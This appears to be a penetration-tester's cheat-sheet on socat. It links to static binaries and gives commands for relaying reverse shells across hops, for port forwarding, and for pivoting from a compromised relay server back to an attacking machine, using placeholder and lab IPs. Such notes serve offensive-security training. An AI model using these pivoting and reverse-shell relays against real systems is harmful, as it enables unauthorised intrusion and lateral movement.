# Socat

[https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3](https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3)

[linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

## Reverse shell relay

This way we can relay reverse shells for multiple hops

```
./socat tcp-l:LPORT tcp:RHOST:RPORT &
```

## Port forwarding (fast n' ugly)

```
./socat tcp-l:LPORT,fork,reuseaddr tcp:RHOST:RPORT &
```

## Port forward (advanced)

First of all, on our own attacking machine, we issue the following command:
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
```
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```


